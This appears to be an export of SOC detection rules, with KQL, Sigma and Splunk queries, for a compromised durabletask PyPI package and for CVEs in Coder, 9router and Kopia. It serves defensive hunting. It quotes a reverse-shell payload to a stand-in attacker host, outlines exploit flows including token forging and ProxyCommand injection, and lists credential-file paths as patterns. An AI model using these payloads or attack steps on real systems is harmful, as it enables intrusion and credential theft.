Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2008-4250")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2008-4250")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

[LLM] Compromised Microsoft durabletask PyPI Package Install (TeamPCP 1.4.1-1.4.3) Delivery High
Detects pip/python installing the TeamPCP-compromised durabletask versions (1.4.0-1.4.3) — Microsoft's Durable Task Python SDK was published with a malicious dropper that fetches rope.pyz. Article-specific because it pins the exact package + version range named in the campaign. Rationale: Anchors on the exact package name 'durabletask' and version range from the article's code blocks plus external corroboration (Wiz, safedep, Aikido confirmed 1.4.1-1.4.3 as the malicious versions published 2026-05-19). pip+package-name+specific-version is high-fidelity — there is no legitimate reason to pin those exact malicious versions. Cross-checked against: • https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack • https://www.stepsecurity.io/blog/microsofts-durabletask-pypi-package-compromised-in-supply-chain-attack • https://safedep.io/malicious-durabletask-pypi-supply-chain-attack/ • https://www.aikido.dev/blog/durabletask-package-compromised-mini-shai-hulud
ATT&CKT1195.002 T1059.006
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("pip","pip3","python","python3","python3.10","python3.11","python3.12")
    or InitiatingProcessFileName in~ ("pip","pip3","python","python3")
| where ProcessCommandLine has "durabletask" or InitiatingProcessCommandLine has "durabletask"
| where ProcessCommandLine has_any ("1.4.1","1.4.2","1.4.3","==1.4.")
    or InitiatingProcessCommandLine has_any ("1.4.1","1.4.2","1.4.3","==1.4.")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessName has_any ("pip","pip3","python","python3")
| where ActingProcessCommandLine has "durabletask"
| where ActingProcessCommandLine has_any ("1.4.1","1.4.2","1.4.3","==1.4.")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc
title: Installation of Compromised durabletask PyPI Versions (TeamPCP)
id: a1f47e8c-9b3d-4d2c-9e1a-7b5c4f8e9d2a
description: Detects pip/python installing durabletask versions 1.4.1-1.4.3, the TeamPCP-compromised supply-chain releases of Microsoft's Durable Task Python SDK that drop rope.pyz.
references:
  - https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack
  - https://snyk.io/blog/durabletask-pypi-supply-chain-attack/
  - https://safedep.io/malicious-durabletask-pypi-supply-chain-attack/
author: SOC Detection Engineering
date: 2026/05/20
tags:
  - attack.t1195.002
  - attack.initial_access
logsource:
  category: process_creation
detection:
  selection_image:
    Image|endswith:
      - '/pip'
      - '/pip3'
      - '/python'
      - '/python3'
  selection_cmd:
    CommandLine|contains: 'durabletask'
  selection_version:
    CommandLine|contains:
      - '1.4.1'
      - '1.4.2'
      - '1.4.3'

[LLM] TeamPCP rope.pyz Dropper Fetch from check.git-service.com C2 Command & Control High
Detects DNS, HTTP, or direct-IP egress to the TeamPCP C2 infrastructure that hosts the durabletask second-stage dropper (rope.pyz). Article-specific because it pins the exact filename and the campaign's named C2 domains. Rationale: Uses the exact payload filename 'rope.pyz' from article code-block 3 and the campaign C2 domain check.git-service.com confirmed by Wiz, safedep, and Aikido. No legitimate developer infrastructure resolves these domains — they were registered 2026-05-16 by the actor and have no clean use case. Cross-checked against: • https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack • https://safedep.io/malicious-durabletask-pypi-supply-chain-attack/ • https://www.aikido.dev/blog/durabletask-package-compromised-mini-shai-hulud • https://thehackernews.com/2026/05/github-investigating-teampcp-claimed.html

[LLM] TeamPCP rope.pyz Dropper Infection Markers on Linux Installation High
Detects creation of TeamPCP's on-disk artifacts from the durabletask compromise: the rope.pyz / managed.pyz dropper payloads in /tmp/ and the ~/.cache/.sys-update-check infection marker. Article-specific because rope.pyz is named verbatim in code block 3. Rationale: Anchors on the verbatim 'rope.pyz' filename from article code block 3, plus the marker files /tmp/managed.pyz and ~/.cache/.sys-update-check confirmed by Wiz, safedep, and Aikido as the dropper's on-disk artifacts. None of these paths/filenames have legitimate Linux usage — they are unique to this campaign. Cross-checked against: • https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack • https://safedep.io/malicious-durabletask-pypi-supply-chain-attack/ • https://www.aikido.dev/blog/durabletask-package-compromised-mini-shai-hulud
ATT&CKT1105 T1036.005
Data sourcesEndpoint.Filesystem
DeviceFileEvents
| where Timestamp > ago(7d)
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where (FolderPath has "/tmp/" and (FileName matches regex @"^rope-.+\.pyz$" or FileName =~ "rope.pyz" or FileName =~ "managed.pyz"))
    or (FolderPath has "/.cache/" and FileName in~ (".sys-update-check",".sys-update-check-k8s"))
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath, FileName, SHA256, FileSize
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where EventType in ("FileCreated","FileModified")
| where (TargetFilePath has "/tmp/" and (TargetFileName matches regex @"^rope-.+\.pyz$" or TargetFileName =~ "rope.pyz" or TargetFileName =~ "managed.pyz"))
    or (TargetFilePath has "/.cache/" and TargetFileName in~ (".sys-update-check",".sys-update-check-k8s"))
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileName, TargetFileSHA256
| order by TimeGenerated desc

[LLM] AWS SSM SendCommand Fan-out from EC2 Instance Role (TeamPCP Worm Propagation) Actions on Objectives Medium
Detects the durabletask worm's lateral-movement stage: a single EC2-instance IAM role calling ssm:SendCommand against multiple EC2 instances within a short window. The rope.pyz worm uses stolen instance-role credentials to push itself to peer instances via SSM RunCommand. Rationale: Captures the worm's worm-stage primitive (ssm:SendCommand from an instance role to peer instances) which Wiz and safedep flagged as the AWS-specific propagation method. CloudTrail-only — Defender XDR and Falcon FDR don't ingest AWS control-plane events, hence empty defender_kql / falcon_logscale_query. Sentinel has the AWSCloudTrail connector but the table isn't in our canonical schema, so left empty rather than guess column names. Cross-checked against: • https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack • https://safedep.io/malicious-durabletask-pypi-supply-chain-attack/
ATT&CKT1021.007 T1651 T1078.004
Data sourcesChange.All_Changes
source:cloudtrail @evt.name:SendCommand @userIdentity.type:AssumedRole @requestParameters.instanceIds:* (-@userAgent:(*aws-cli/* AND *root/*) AND -@userIdentity.sessionContext.sessionIssuer.userName:(*ssm-automation* OR *patch-manager* OR *config-rule*))
CLOUD
`cloudtrail` eventName=SendCommand eventSource="ssm.amazonaws.com" "userIdentity.type"="AssumedRole" 
| eval source_role=mvindex(split('userIdentity.sessionContext.sessionIssuer.arn',"/"),-1)
| eval target_count=mvcount('requestParameters.instanceIds{}')
| stats latest(_time) as last_seen dc('requestParameters.instanceIds{}') as DistinctTargets values('requestParameters.instanceIds{}') as Targets values(sourceIPAddress) as SourceIPs values(userAgent) as UAs by source_role 'userIdentity.arn' awsRegion
| where DistinctTargets >= 3 OR like(source_role, "%ec2%") OR like(source_role, "%-instance-%")
| sort 0 -last_seen
[LLM] Python Process Reading Multi-Cloud Credential Stores (durabletask Stealer Stage) Actions on Objectives Medium
Detects a single Python process opening credential files from THREE OR MORE distinct cloud/dev ecosystems within a 5-minute window — the signature behaviour of the rope.pyz multi-cloud stealer that harvests AWS, Azure, GCP, Kubernetes, npm, GitHub, Docker, and SSH secrets in one pass. Rationale: Targets the rope.pyz second-stage behaviour that Wiz and safedep documented: a single python process enumerating credentials across AWS + Azure + GCP + Kubernetes + npm + GitHub + Docker + SSH within seconds. The DistinctSecretFamilies>=3 threshold eliminates legitimate cloud SDKs that touch one ecosystem at a time while still catching the multi-cloud stealer in a single hit. Cross-checked against: • https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack • https://safedep.io/malicious-durabletask-pypi-supply-chain-attack/ • https://securitylabs.datadoghq.com/articles/litellm-compromised-pypi-teampcp-supply-chain-campaign/
ATT&CKT1552.001 T1555.005 T1528
Data sourcesEndpoint.Filesystem
DeviceFileEvents
| where Timestamp > ago(7d)
| where ActionType in ("FileOpened","FileCreated","FileRenamed")
| where InitiatingProcessFileName in~ ("python","python3","python3.10","python3.11","python3.12")
| extend SecretFamily = case(
    FolderPath has "/.aws/","aws",
    FolderPath has "/.azure/","azure",
    FolderPath has "/.config/gcloud/","gcp",
    FolderPath has "/.kube/","k8s",
    FolderPath has "/.docker/","docker",
    FileName =~ ".npmrc","npm",
    FileName =~ ".git-credentials","git",
    FolderPath has "/.config/gh/" and FileName =~ "hosts.yml","gh",
    FolderPath has "/.ssh/" and FileName startswith "id_","ssh",
    "other")
| where SecretFamily != "other"
| summarize DistinctSecretFamilies = dcount(SecretFamily), SecretFamilies = make_set(SecretFamily), PathSample = make_set(strcat(FolderPath,"/",FileName), 20), Cmd = any(InitiatingProcessCommandLine), arg_min(Timestamp, *) by DeviceName, InitiatingProcessAccountName, InitiatingProcessId, bin(Timestamp, 5m)
| where DistinctSecretFamilies >= 3
| where InitiatingProcessAccountName !endswith "$"
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActingProcessName has_any ("python","python3")
| extend SecretFamily = case(
    TargetFilePath has "/.aws/","aws",
    TargetFilePath has "/.azure/","azure",
    TargetFilePath has "/.config/gcloud/","gcp",
    TargetFilePath has "/.kube/","k8s",
    TargetFilePath has "/.docker/","docker",
    TargetFileName =~ ".npmrc","npm",
    TargetFileName =~ ".git-credentials","git",
    TargetFilePath has "/.config/gh/" and TargetFileName =~ "hosts.yml","gh",
    TargetFilePath has "/.ssh/" and TargetFileName startswith "id_","ssh",
    "other")
| where SecretFamily != "other"
| summarize DistinctSecretFamilies = dcount(SecretFamily), SecretFamilies = make_set(SecretFamily), PathSample = make_set(TargetFilePath, 20), Cmd = any(ActingProcessCommandLine), arg_min(TimeGenerated, *) by DvcHostname, ActorUsername, ActingProcessId, bin(TimeGenerated, 5m)
| where DistinctSecretFamilies >= 3
| order by TimeGenerated desc
source:linux.auditd (@auditd.type:OPENAT OR @auditd.type:PATH) @process.executable.path:(*/python OR */python3 OR */python3.*) @file.path:(*/.aws/credentials OR */.aws/config OR */.azure/accessTokens.json OR */.azure/azureProfile.json OR */.config/gcloud/credentials.db OR */.config/gcloud/application_default_credentials.json OR */.kube/config OR */.npmrc OR */.docker/config.json OR */.git-credentials OR */.config/gh/hosts.yml OR */.ssh/id_*)
#event_simpleName=FileOpenInfo ContextImageFileName=/\/python3?(\.\d+)?$/i TargetFileName=/(\/\.aws\/(credentials|config)|\/\.azure\/(accessTokens|azureProfile)\.json|\/\.config\/gcloud\/(credentials\.db|application_default_credentials\.json)|\/\.kube\/config|\/\.npmrc|\/\.docker\/config\.json|\/\.git-credentials|\/\.config\/gh\/hosts\.yml|\/\.ssh\/id_)/i
| case {
    TargetFileName=/\.aws\// | SecretFamily:="aws";
    TargetFileName=/\.azure\// | SecretFamily:="azure";
    TargetFileName=/gcloud\// | SecretFamily:="gcp";
    TargetFileName=/\.kube\// | SecretFamily:="k8s";
    TargetFileName=/\.docker\// | SecretFamily:="docker";
    TargetFileName=/\.npmrc/ | SecretFamily:="npm";
    TargetFileName=/\.git-credentials|\.config\/gh\// | SecretFamily:="git";
    TargetFileName=/\.ssh\/id_/ | SecretFamily:="ssh";
    *;
  }
| groupBy([aid, ComputerName, ContextProcessId], function=[count(field=SecretFamily, distinct=true, as=DistinctFamilies), collect([SecretFamily, TargetFileName])])
| DistinctFamilies>=3

DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-46412")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-46412")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

OAuth consent / suspicious app grant Actions on Objectives High
Cloud identity abuse: app gets high-priv scopes, often via consent phishing.
ATT&CKT1528 T1098.001
Data sourcesAuthentication.Authentication CloudAppEvents
CloudAppEvents
| where Timestamp > ago(7d)
| where ActionType in ("Consent to application.","Add OAuth2PermissionGrant.","Add delegated permission grant.")
| project Timestamp, AccountObjectId, AccountDisplayName, ActivityType,
          ActivityObjects, IPAddress, UserAgent
// Entra ID directory audit — user / admin consent to a third-party app.
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName has "Consent to application"
| where Result =~ "success"
| extend AppName = tostring(parse_json(tostring(TargetResources))[0].displayName),
         AppId   = tostring(parse_json(tostring(TargetResources))[0].id),
         User    = tostring(parse_json(tostring(InitiatedBy)).user.userPrincipalName)
| project TimeGenerated, OperationName, User, AppName, AppId, Result
| order by TimeGenerated desc

Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca") or SHA1 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca") or MD5 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca") or SHA1 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca") or MD5 in~ ("2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "12ed9a3c1f73617aefdb740480695c04405d7b4b", "e7d582b98ca80690883175470e96f703ef6dc497", "833fd59ebe66a4449982c6d18db656b4", "b82e54923f7e440664d2d75bd31588ca"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).

[LLM] Coder CVE-2026-46354 - Burst of azure-instance-identity POSTs (vmId enumeration / forged PKCS#7) Exploitation Medium
Detects multiple POST requests to the unauthenticated /api/v2/workspaceagents/azure-instance-identity endpoint from a single source within a short window — the signature of an attacker enumerating workspace vmId UUIDs to brute-force-redeem agent tokens via the forged PKCS#7 envelope flaw. A legitimate Coder workspace agent only registers once per VM lifetime, so >=5 POSTs to this exact path from one source in 10 minutes is anomalous. Rationale: The endpoint path is uniquely identified in the advisory as the unauthenticated PKCS#7 verification entry point. Burst-from-one-source on this specific path is the visible HTTP-layer shape of vmId UUID enumeration described in the article. Cross-checked Coder's public API docs at coder.com/docs/reference/api/agents to confirm the endpoint exists in legitimate v2 deployments. Defender Advanced Hunting has no native HTTP request log for self-hosted Coder, so defender_kql is intentionally empty. Falcon LogScale FDR does not ship application-layer HTTP request URLs from Coder, so falcon_logscale_query is also empty. Cross-checked against: • https://github.com/advisories/GHSA-6x44-w3xg-hqqf • https://coder.com/docs/reference/api/agents • https://github.com/coder/coder/pull/25286
ATT&CKT1190 T1133
Data sourcesWeb
let WindowMin = 10m;
let Threshold = 5;
ImWebSession
| where TimeGenerated > ago(7d)
| where HttpMethod == "POST"
| where Url has "/api/v2/workspaceagents/azure-instance-identity"
| summarize Attempts = count(),
            Successes = countif(HttpStatusCode in ("200","204")),
            DistinctUserAgents = dcount(HttpRequestHeaderUserAgent),
            FirstSeen = min(TimeGenerated),
            LastSeen = max(TimeGenerated)
            by SrcIpAddr, DstHostname, bin(TimeGenerated, WindowMin)
| where Attempts >= Threshold
| order by Attempts desc

[LLM] Coder CVE-2026-46354 - Agent token redemption: PKCS#7 POST followed by gitsshkey / external-auth GET Actions on Objectives High
Correlates a POST to /api/v2/workspaceagents/azure-instance-identity with a GET to /workspaceagents/me/gitsshkey or /workspaceagents/me/external-auth from the same source IP within 30 minutes — the exact two-step attack flow the advisory documents (forge PKCS#7 envelope → use returned agent session token to pull Git SSH private key and OAuth credentials). This catches the credential-access stage even when a single vmId is targeted (UC1's burst signal misses). Rationale: The advisory explicitly chains POST /azure-instance-identity (token issuance) to GET /me/gitsshkey and GET /me/external-auth (credential read) as the documented post-exploit steps. Same-source-IP join with a 30-minute window captures the attacker round-trip while remaining tight enough to drop unrelated traffic. Endpoints confirmed in Coder's public API reference. Defender XDR lacks application HTTP logs for self-hosted Coder; Falcon FDR same — both left empty by design. Cross-checked against: • https://github.com/advisories/GHSA-6x44-w3xg-hqqf • https://coder.com/docs/reference/api/agents • https://coder.com/docs/admin/external-auth
ATT&CKT1528 T1552.004 T1190
Data sourcesWeb
let Lookback = 7d;
let WindowSec = 1800;
let Auth = ImWebSession
    | where TimeGenerated > ago(Lookback)
    | where HttpMethod == "POST"
    | where Url has "/api/v2/workspaceagents/azure-instance-identity"
    | where HttpStatusCode in ("200","204","")
    | project AuthTime = TimeGenerated, SrcIpAddr, DstHostname, AuthUrl = Url, AuthUA = HttpRequestHeaderUserAgent;
let Exfil = ImWebSession
    | where TimeGenerated > ago(Lookback)
    | where HttpMethod == "GET"
    | where Url has_any ("/workspaceagents/me/gitsshkey", "/workspaceagents/me/external-auth")
    | where HttpStatusCode in ("200","")
    | project ExfilTime = TimeGenerated, SrcIpAddr, DstHostname, ExfilUrl = Url, ExfilUA = HttpRequestHeaderUserAgent;
Auth
| join kind=inner Exfil on SrcIpAddr, DstHostname
| where ExfilTime between (AuthTime .. AuthTime + WindowSec * 1s)
| extend DelaySec = datetime_diff('second', ExfilTime, AuthTime)
| project AuthTime, ExfilTime, DelaySec, SrcIpAddr, DstHostname, AuthUrl, ExfilUrl, AuthUA, ExfilUA
| order by AuthTime desc

[LLM] Coder CVE-2026-46354 - Inventory of vulnerable Coder v2 versions Reconnaissance High
Hygiene hunt: enumerate all hosts running an unpatched Coder v2 server using Defender TVM CVE data and surface those that are internet-facing first. The advisory lists six patched lines (v2.33.3 / v2.32.2 / v2.31.12 / v2.30.8 / v2.29.13 / v2.24.5); anything earlier on each line is exploitable without authentication. Pairs with UC1/UC2 to prioritise instances that need either immediate patching or a switch to token-based agent auth. Rationale: DeviceTvmSoftwareVulnerabilities is the canonical Defender table for CVE-based exposure tracking; pairing with DeviceInfo's IsInternetFacing flag surfaces the highest-risk hosts first. The CVE ID and patched-version list come directly from the GHSA advisory body. Datadog logs and Falcon FDR don't carry SBOM/CVE rollups in their standard log tables, so those fields are empty by design. Cross-checked against: • https://github.com/advisories/GHSA-6x44-w3xg-hqqf • https://github.com/coder/coder/pull/25286

[LLM] 9router unauthenticated RCE — POST /api/cli-tools/cowork-settings with customPlugins.command Exploitation High
Detects HTTP POST to the unauthenticated 9router cowork-settings endpoint with a customPlugins array containing an executable command field — the registration step of CVE-2026-46339 RCE before the SSE-triggered spawn(). Default Docker exposure is 0.0.0.0:20128. Rationale: The article names the exact vulnerable POST endpoint /api/cli-tools/cowork-settings (src/app/api/cli-tools/cowork-settings/route.js lines 292-319) and the Docker default port 20128. Any external unauthenticated POST to this path is exploitation by definition since the route is unguarded by middleware (src/proxy.js matcher) and the customPlugins.command/args fields are stored verbatim into globalThis.__9routerCustomPlugins. Cross-checked against: • https://github.com/advisories/GHSA-fhh6-4qxv-rpqj

[LLM] 9router CVE-2026-46339 — GET /api/mcp/{plugin}/sse triggers stored command spawn() Exploitation High
Detects unauthenticated HTTP GET to /api/mcp/<plugin>/sse on 9router — the second step of CVE-2026-46339 that invokes Node.js spawn() with the attacker-controlled command/args previously registered via /api/cli-tools/cowork-settings. [LLM] 9router Node.js process spawning shell binary (CVE-2026-46339 post-exploit) Installation High
Detects /bin/sh, /bin/bash or other shells spawned with node (server.js / next-server) as the parent process — direct host-side evidence of CVE-2026-46339 plugin-bridge RCE where attacker-controlled command/args reach Node's spawn() via the MCP stdio→SSE bridge. Rationale: The article describes the exact code path src/lib/mcp/stdioSseBridge.js line 138 calling spawn(plugin.command, plugin.args) with attacker-controlled values. The PoC payloads use /bin/sh -c and /bin/bash -i directly, so a node→shell parent-child pair on a 9router host is high-fidelity exploitation evidence — Node.js apps in production rarely shell out to /bin/sh directly. Cross-checked against: • https://github.com/advisories/GHSA-fhh6-4qxv-rpqj

[LLM] Reverse shell from 9router-spawned shell — outbound TCP from node-child bash Command & Control Medium
Detects outbound network connections originating from /bin/bash or /bin/sh processes whose parent is node — the typical reverse-shell post-exploitation pattern of CVE-2026-46339, including the PoC payload `bash -i >& /dev/tcp/ATTACKER/4444 0>&1`. Rationale: The article's PoC explicitly shows `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1` as the reverse-shell payload registered via customPlugins.args. Detecting node→bash→outbound-TCP at the EDR layer catches the actual exploitation impact even when web-tier logs are unavailable (reverse-proxy not in scope or container egress). Sentinel KQL omitted: ImNetworkSession lacks initiating-process correlation fields and Linux Syslog/auditd entries reach Sentinel without the structured parent-process linkage needed for high fidelity. Cross-checked against: • https://github.com/advisories/GHSA-fhh6-4qxv-rpqj

[LLM] Kopia process spawns ssh with -oProxyCommand= argument (CVE-2026-45695) Exploitation High
Detects exploitation of Kopia's unauthenticated SFTP/externalSSH path injection. When the vulnerable /api/v1/repo/exists handler invokes blob.NewStorage with attacker-supplied sshArguments, the kopia process directly forks ssh with a -oProxyCommand= token that OpenSSH then executes via $SHELL -c. The kopia→ssh parent/child with ProxyCommand in the child argv is a near-zero-FP signature of this RCE. Rationale: Uses the exact narrow signature described in the advisory: kopia process (vulnerable handler) directly invoking exec.CommandContext("ssh", ...) with a ProxyCommand token. The string 'ProxyCommand' in an ssh argv whose parent is kopia has effectively no benign use case outside intentional SFTP jump-host setups. Cross-checked against the GHSA advisory, the Kopia v0.22.3 source references in the article, and the fix PR #5354. Cross-checked against: • https://github.com/kopia/kopia/pull/5354 • https://github.com/kopia/kopia/blob/v0.22.3/repo/blob/sftp/sftp_storage.go • https://nvd.nist.gov/vuln/detail/CVE-2026-45695
ATT&CKT1190 T1059.004 T1059.003

DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("kopia","kopia.exe","kopia-ui","kopia-ui.exe")
| where FileName in~ ("ssh","ssh.exe")
| where ProcessCommandLine has "ProxyCommand"
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, FolderPath, ProcessCommandLine, ProcessId, InitiatingProcessId, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("kopia","kopia.exe","kopia-ui","kopia-ui.exe")
| where ActingProcessName has_any ("ssh","ssh.exe")
| where ActingProcessCommandLine has "ProxyCommand"
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine, ActingProcessId
| order by TimeGenerated desc
title: Kopia Spawning SSH with ProxyCommand Argument (CVE-2026-45695)
id: 7c6f8e2a-3b21-4d8b-b9f6-9a4d0c1f5e21
description: Detects exploitation of Kopia CVE-2026-45695 where the unauthenticated /api/v1/repo/exists handler triggers the kopia process to invoke ssh with an attacker-controlled -oProxyCommand= argument, leading to command execution as the kopia user.
references:
  - https://github.com/advisories/GHSA-2q4c-3mrw-63c3
  - https://github.com/kopia/kopia/pull/5354
author: SOC Detection Engineering
date: 2026/05/20

[LLM] SSH process spawned by Kopia invokes a shell child (ProxyCommand execution) Installation High
Detects the second-stage execution arm of CVE-2026-45695: OpenSSH evaluates -oProxyCommand=<cmd> by invoking $SHELL -c <cmd> before any TCP connect. The resulting kopia → ssh → (sh|bash|cmd|powershell) grand-parent/parent/child chain is the artifact of arbitrary code running as the kopia service account. Rationale: This is the exact execution chain the advisory describes — OpenSSH spawns $SHELL -c <attacker_cmd> before attempting TCP, so the shell child of ssh is the observable smoking gun. Pairing it with a kopia grand-parent (via SshPid join) removes essentially all benign ssh ProxyCommand use. Confirmed against the GHSA advisory text and OpenSSH ProxyCommand documented behaviour. Cross-checked against: • https://github.com/advisories/GHSA-2q4c-3mrw-63c3 • https://man.openbsd.org/ssh_config.5#ProxyCommand • https://github.com/kopia/kopia/pull/5354
ATT&CKT1059.004 T1059.001 T1059.003 T1203
Data sourcesEndpoint.Processes
let kopia_ssh =
    DeviceProcessEvents
    | where Timestamp > ago(7d)
    | where InitiatingProcessFileName in~ ("kopia","kopia.exe","kopia-ui","kopia-ui.exe")
    | where FileName in~ ("ssh","ssh.exe")
    | project SshTime = Timestamp, DeviceId, SshPid = ProcessId, SshCmd = ProcessCommandLine, KopiaCmd = InitiatingProcessCommandLine;
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("ssh","ssh.exe")
